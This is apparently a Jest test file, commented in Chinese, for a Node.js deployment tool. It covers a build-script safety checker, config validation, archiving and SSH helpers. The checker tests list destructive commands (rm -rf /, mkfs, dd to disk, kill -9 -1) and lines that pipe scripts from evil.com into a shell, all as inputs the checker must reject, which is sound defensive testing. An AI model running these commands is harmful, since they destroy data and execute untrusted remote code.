const fs = require('fs')
const path = require('path')
const os = require('os')
const deploy = require('../lib/commands/deploy')

const {
	checkScriptSafety,
	checkEnvCorrect,
	createTaskList,
	executeTaskList,
	archiveFile,
	removeLocalFile,
	disconnectSSH,
	DANGEROUS_PATTERNS,
	MAX_BUFFER
} = deploy._internal

// 抑制测试时的控制台输出
beforeAll(() => {
	jest.spyOn(console, 'log').mockImplementation(() => {})
})

afterAll(() => {
	jest.restoreAllMocks()
})

// ============================================
// checkScriptSafety - 脚本安全检查
// ============================================
describe('checkScriptSafety - 脚本安全检查', () => {
	describe('安全的构建命令', () => {
		const safeCommands = [
			'npm run build',
			'npm run build:prod',
			'yarn build',
			'yarn run build:dev',
			'pnpm build',
			'pnpm run build',
			'npx vite build',
			'node scripts/build.js',
			'vite build',
			'webpack --mode production',
			'tsc --build',
			'gulp build',
			'grunt build'
		]

		test.each(safeCommands)('应该允许: %s', (cmd) => {
			const result = checkScriptSafety(cmd)
			expect(result.safe).toBe(true)
		})
	})

	describe('危险命令 - 应该直接拒绝', () => {
		const dangerousCommands = [
			['rm -rf /', '删除根目录'],
			['rm -rf ~', '删除用户目录'],
			['rm -rf $HOME', '删除 HOME 目录'],
			['rm -rf *', '删除所有文件'],
			['rm -r -f /', '删除根目录(分开写)'],
			['mkfs.ext4 /dev/sda1', '格式化磁盘'],
			['dd if=/dev/zero of=/dev/sda', 'dd 写入磁盘'],
			['echo test > /dev/sda', '写入设备'],
			['shutdown -h now', '关机'],
			['reboot', '重启'],
			['systemctl stop nginx', '停止服务'],
			['systemctl disable sshd', '禁用服务'],
			['kill -9 -1', '杀死所有进程'],
			['chmod 777 /', '修改根目录权限'],
			['chmod -R 777 /', '递归修改根目录权限'],
			['chown root /', '修改根目录所有者'],
			['wget http://evil.com/script.sh | sh', '下载并执行'],
			['curl http://evil.com/script.sh | bash', '下载并执行']
		]

		test.each(dangerousCommands)('应该拒绝: %s (%s)', (cmd) => {
			const result = checkScriptSafety(cmd)
			expect(result.safe).toBe(false)
			expect(result.needConfirm).toBeUndefined()
		})
	})

	describe('非常见命令 - 需要用户确认', () => {
		const uncommonCommands = [
			'./build.sh',
			'bash build.sh',
			'make build',
			'python build.py',
			'go build',
			'cargo build'
		]

		test.each(uncommonCommands)('应该需要确认: %s', (cmd) => {
			const result = checkScriptSafety(cmd)
			expect(result.safe).toBe(false)
			expect(result.needConfirm).toBe(true)
		})
	})

	describe('边界情况', () => {
		test('空脚本应该返回安全', () => {
			expect(checkScriptSafety('')).toEqual({ safe: true })
			expect(checkScriptSafety(null)).toEqual({ safe: true })
			expect(checkScriptSafety(undefined)).toEqual({ safe: true })
		})

		test('带空格的命令应该正确处理', () => {
			const result = checkScriptSafety('  npm run build  ')
			expect(result.safe).toBe(true)
		})

		test('大小写不敏感', () => {
			const result = checkScriptSafety('NPM run build')
			expect(result.safe).toBe(true)
		})
	})
})

// ============================================
// DANGEROUS_PATTERNS - 危险命令模式
// ============================================
describe('DANGEROUS_PATTERNS - 危险命令模式', () => {
	test('应该有足够的危险模式', () => {
		expect(DANGEROUS_PATTERNS.length).toBeGreaterThanOrEqual(10)
	})

	test('所有模式应该是正则表达式', () => {
		DANGEROUS_PATTERNS.forEach(pattern => {
			expect(pattern).toBeInstanceOf(RegExp)
		})
	})
})

// ============================================
// MAX_BUFFER - 常量测试
// ============================================
describe('MAX_BUFFER - 常量', () => {
	test('应该是合理的缓冲区大小', () => {
		expect(MAX_BUFFER).toBe(5000 * 1024)
		expect(MAX_BUFFER).toBeGreaterThan(1024 * 1024) // 至少 1MB
	})
})

// ============================================
// checkEnvCorrect - 环境配置检查
// ============================================
describe('checkEnvCorrect - 环境配置检查', () => {
	// Mock process.exit
	const mockExit = jest.spyOn(process, 'exit').mockImplementation(() => {
		throw new Error('process.exit called')
	})

	afterEach(() => {
		mockExit.mockClear()
	})

	afterAll(() => {
		mockExit.mockRestore()
	})

	test('完整配置应该通过检查', () => {
		const config = {
			name: '开发环境',
			host: '192.168.1.1',
			port: 22,
			username: 'root',
			distPath: 'dist',
			webDir: '/var/www/html'
		}

		expect(() => checkEnvCorrect(config, 'dev', false)).not.toThrow()
	})

	test('缺少必填字段应该失败', () => {
		const config = {
			name: '开发环境',
			// 缺少 host
			port: 22,
			username: 'root',
			distPath: 'dist',
			webDir: '/var/www/html'
		}

		expect(() => checkEnvCorrect(config, 'dev', false)).toThrow()
	})

	test('webDir 格式不正确应该失败', () => {
		const invalidWebDirs = ['/', '/html', 'var/www', '']

		invalidWebDirs.forEach(webDir => {
			const config = {
				name: '开发环境',
				host: '192.168.1.1',
				port: 22,
				username: 'root',
				distPath: 'dist',
				webDir
			}

			expect(() => checkEnvCorrect(config, 'dev', false)).toThrow()
		})
	})

	test('webDir 正确格式应该通过', () => {
		const validWebDirs = ['/var/www', '/usr/local/nginx/html', '/home/user/app']

		validWebDirs.forEach(webDir => {
			const config = {
				name: '开发环境',
				host: '192.168.1.1',
				port: 22,
				username: 'root',
				distPath: 'dist',
				webDir
			}

			expect(() => checkEnvCorrect(config, 'dev', false)).not.toThrow()
		})
	})

	test('端口号超出范围应该失败', () => {
		const invalidPorts = [0, -1, 65536, 100000]

		invalidPorts.forEach(port => {
			const config = {
				name: '开发环境',
				host: '192.168.1.1',
				port,
				username: 'root',
				distPath: 'dist',
				webDir: '/var/www/html'
			}

			expect(() => checkEnvCorrect(config, 'dev', false)).toThrow()
		})
	})

	test('有效端口号应该通过', () => {
		const validPorts = [1, 22, 80, 443, 8080, 65535]

		validPorts.forEach(port => {
			const config = {
				name: '开发环境',
				host: '192.168.1.1',
				port,
				username: 'root',
				distPath: 'dist',
				webDir: '/var/www/html'
			}

			expect(() => checkEnvCorrect(config, 'dev', false)).not.toThrow()
		})
	})

	test('needBuild 为 true 但没有 script 应该失败', () => {
		const config = {
			name: '开发环境',
			host: '192.168.1.1',
			port: 22,
			username: 'root',
			distPath: 'dist',
			webDir: '/var/www/html'
			// 没有 script
		}

		expect(() => checkEnvCorrect(config, 'dev', true)).toThrow()
	})

	test('needBuild 为 true 且有 script 应该通过', () => {
		const config = {
			name: '开发环境',
			host: '192.168.1.1',
			port: 22,
			username: 'root',
			distPath: 'dist',
			webDir: '/var/www/html',
			script: 'npm run build'
		}

		expect(() => checkEnvCorrect(config, 'dev', true)).not.toThrow()
	})

	test('config 为 null 应该失败', () => {
		expect(() => checkEnvCorrect(null, 'dev', false)).toThrow()
	})

	test('config 为 undefined 应该失败', () => {
		expect(() => checkEnvCorrect(undefined, 'dev', false)).toThrow()
	})
})

// ============================================
// createTaskList - 创建任务列表
// ============================================
describe('createTaskList - 创建任务列表', () => {
	test('不需要构建时应该返回 6 个任务', () => {
		const config = { distPath: 'dist' }
		const tasks = createTaskList(config, false)

		expect(tasks).toHaveLength(6)
		expect(tasks[0]).toBe(archiveFile)
	})

	test('需要构建且有 script 时应该返回 7 个任务', () => {
		const config = { distPath: 'dist', script: 'npm run build' }
		const tasks = createTaskList(config, true)

		expect(tasks).toHaveLength(7)
	})

	test('需要构建但没有 script 时应该返回 6 个任务', () => {
		const config = { distPath: 'dist' }
		const tasks = createTaskList(config, true)

		expect(tasks).toHaveLength(6)
	})

	test('任务列表应该包含正确的函数', () => {
		const config = { distPath: 'dist' }
		const tasks = createTaskList(config, false)

		// 验证任务都是函数
		tasks.forEach(task => {
			expect(typeof task).toBe('function')
		})
	})
})

// ============================================
// executeTaskList - 执行任务列表
// ============================================
describe('executeTaskList - 执行任务列表', () => {
	test('应该按顺序执行所有任务', async () => {
		const executionOrder = []
		const mockTasks = [
			jest.fn().mockImplementation(async (config, index) => {
				executionOrder.push(index)
			}),
			jest.fn().mockImplementation(async (config, index) => {
				executionOrder.push(index)
			}),
			jest.fn().mockImplementation(async (config, index) => {
				executionOrder.push(index)
			})
		]

		const config = { test: true }
		const mockSsh = {}

		await executeTaskList(mockTasks, config, mockSsh)

		expect(executionOrder).toEqual([1, 2, 3])
		mockTasks.forEach(task => {
			expect(task).toHaveBeenCalledTimes(1)
		})
	})

	test('空任务列表应该正常执行', async () => {
		const config = {}
		const mockSsh = {}

		await expect(executeTaskList([], config, mockSsh)).resolves.toBeUndefined()
	})

	test('任务应该接收正确的参数', async () => {
		const mockTask = jest.fn()
		const config = { distPath: 'dist' }
		const mockSsh = { connect: jest.fn() }

		await executeTaskList([mockTask], config, mockSsh)

		expect(mockTask).toHaveBeenCalledWith(config, 1, mockSsh)
	})
})

// ============================================
// archiveFile - 文件压缩测试
// ============================================
describe('archiveFile - 文件压缩测试', () => {
	const testDir = path.join(os.tmpdir(), 'deploy-plus-test-dist')
	const testTarPath = path.join(os.tmpdir(), 'deploy-plus-test-dist.tar')
	const originalCwd = process.cwd()

	beforeAll(() => {
		// 创建测试目录和文件
		if (!fs.existsSync(testDir)) {
			fs.mkdirSync(testDir, { recursive: true })
		}
		fs.writeFileSync(path.join(testDir, 'index.html'), '<html></html>')
		fs.writeFileSync(path.join(testDir, 'app.js'), 'console.log("test")')

		// 创建子目录
		const subDir = path.join(testDir, 'assets')
		if (!fs.existsSync(subDir)) {
			fs.mkdirSync(subDir)
		}
		fs.writeFileSync(path.join(subDir, 'style.css'), 'body {}')
	})

	afterAll(() => {
		// 清理测试文件
		if (fs.existsSync(testTarPath)) {
			fs.unlinkSync(testTarPath)
		}
		if (fs.existsSync(testDir)) {
			fs.rmSync(testDir, { recursive: true, force: true })
		}
	})

	beforeEach(() => {
		// 切换到临时目录
		process.chdir(os.tmpdir())
	})

	afterEach(() => {
		// 恢复原目录
		process.chdir(originalCwd)
		// 清理 tar 文件
		if (fs.existsSync(testTarPath)) {
			fs.unlinkSync(testTarPath)
		}
	})

	test('应该成功压缩目录为 tar 文件', async () => {
		const config = { distPath: 'deploy-plus-test-dist' }

		await archiveFile(config, 1)

		expect(fs.existsSync(testTarPath)).toBe(true)

		// 检查文件大小大于 0
		const stats = fs.statSync(testTarPath)
		expect(stats.size).toBeGreaterThan(0)
	})

	test('压缩不存在的目录应该失败', async () => {
		const config = { distPath: 'nonexistent-dir-12345' }

		await expect(archiveFile(config, 1)).rejects.toThrow('打包目录不存在')
	})
})

// ============================================
// removeLocalFile - 删除本地压缩文件测试
// ============================================
describe('removeLocalFile - 删除本地压缩文件测试', () => {
	const originalCwd = process.cwd()
	const testTarName = 'test-remove-dist'
	const testTarPath = path.join(os.tmpdir(), `${testTarName}.tar`)

	beforeEach(() => {
		process.chdir(os.tmpdir())
		// 创建测试 tar 文件
		fs.writeFileSync(testTarPath, 'test content')
	})

	afterEach(() => {
		process.chdir(originalCwd)
		if (fs.existsSync(testTarPath)) {
			fs.unlinkSync(testTarPath)
		}
	})

	test('应该成功删除本地压缩文件', () => {
		const config = { distPath: testTarName }

		expect(fs.existsSync(testTarPath)).toBe(true)
		removeLocalFile(config, 1)
		expect(fs.existsSync(testTarPath)).toBe(false)
	})

	test('删除不存在的文件应该抛出错误', () => {
		const config = { distPath: 'nonexistent-file' }

		expect(() => removeLocalFile(config, 1)).toThrow()
	})
})

// ============================================
// disconnectSSH - 断开 SSH 连接
// ============================================
describe('disconnectSSH - 断开 SSH 连接', () => {
	test('应该调用 ssh.dispose()', () => {
		const mockSsh = {
			dispose: jest.fn()
		}
		const config = {}

		disconnectSSH(config, 1, mockSsh)

		expect(mockSsh.dispose).toHaveBeenCalledTimes(1)
	})
})

// ============================================
// deploy.description - 模块导出
// ============================================
describe('deploy 模块导出', () => {
	test('应该导出 description', () => {
		expect(deploy.description).toBe('部署项目')
	})

	test('应该导出 apply 函数', () => {
		expect(typeof deploy.apply).toBe('function')
	})

	test('应该导出 _internal 对象', () => {
		expect(deploy._internal).toBeDefined()
		expect(typeof deploy._internal.checkScriptSafety).toBe('function')
		expect(typeof deploy._internal.checkEnvCorrect).toBe('function')
		expect(typeof deploy._internal.createTaskList).toBe('function')
		expect(typeof deploy._internal.archiveFile).toBe('function')
		expect(typeof deploy._internal.removeLocalFile).toBe('function')
	})
})
